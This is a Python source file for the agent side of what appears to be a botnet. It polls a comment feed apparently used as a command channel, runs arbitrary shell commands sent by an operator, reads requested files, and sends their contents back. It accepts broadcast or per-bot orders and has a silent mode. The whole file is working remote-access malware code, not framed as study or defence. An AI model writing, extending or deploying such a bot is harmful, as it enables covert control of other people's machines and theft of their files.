import argparse
import sys
import random
import time
import utils
from utils import Command
import log

SHOW_INFO = True
LOGFILE = '.botlog'

BOT_ID = 0
LAST_COMMENT = 0


# TODO: better error message
def error(cmd, data, r):
    return "ERROR"


def handle_command(cmd, data, r):
    if cmd == Command.HEARTBEAT:
        out = ""

    elif cmd == Command.CMD:
        try:
            assert data
            out = utils.perform_command(data)
        except:
            out = error(cmd, data, r)

    elif cmd == Command.SEND_FILE:
        try:
            assert data
            out = read_file(data)
        except:
            out = error(cmd, data, r)

    log.add_log_entry(SHOW_INFO, LOGFILE, log.CommandAndResponse(cmd, data, r, out))
    if r: return respond(cmd, out, r)
    return out


def respond(cmd, out, r):
    msg = utils.construct_message(False, BOT_ID, cmd, out, r)
    return utils.send_message(msg)


def check_for_commands():
    global LAST_COMMENT
    
    messages, LAST_COMMENT = utils.get_fresh_messages(LAST_COMMENT)
    log.add_log_entry(SHOW_INFO, LOGFILE, log.CheckForCommands(len(messages)))
    
    handled = 0
    for msg in messages:
        ok, isctrl, bot, cmd, d, r = utils.parse_message(msg)
        if not ok: continue
        if isctrl and (bot == utils.BROADCAST or bot == BOT_ID):
            handle_command(cmd, d, r)
            handled += 1
    return handled


def read_file(filepath):
    file = open(filepath, 'r')
    filedata = file.read()
    file.close()
    return filepath + '\n' + filedata


def main():
    global LAST_COMMENT

    LAST_COMMENT = utils.get_last_comment_id()
    log.add_log_entry(SHOW_INFO, LOGFILE, log.InitEntry(LAST_COMMENT))

    while True:
        if SHOW_INFO: print("SLEEP\n")
        time.sleep(utils.REFRESH_DELAY)
        check_for_commands()


if __name__ == "__main__":
    BOT_ID = random.randint(1, sys.maxsize)
    utils.init_config()

    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--silent', action='store_true')
    
    args = parser.parse_args()
    if args.silent: SHOW_INFO = False

    main()
